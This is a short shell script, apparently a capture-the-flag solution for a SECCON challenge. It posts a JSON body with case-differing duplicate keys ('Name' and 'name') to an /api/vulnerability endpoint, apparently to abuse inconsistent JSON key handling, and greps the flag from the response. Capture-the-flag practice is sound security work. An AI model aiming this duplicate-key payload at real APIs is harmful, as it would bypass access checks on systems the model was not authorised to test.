for i in $(seq 10)
do
  curl -sS https://${SECCON_HOST}:${SECCON_PORT}/api/vulnerability -d '{"Name": "x", "name": "", "ID": 14}' | \
  grep -oP 'SECCON{.*?}' | \
  head -n 1

  sleep 1
done
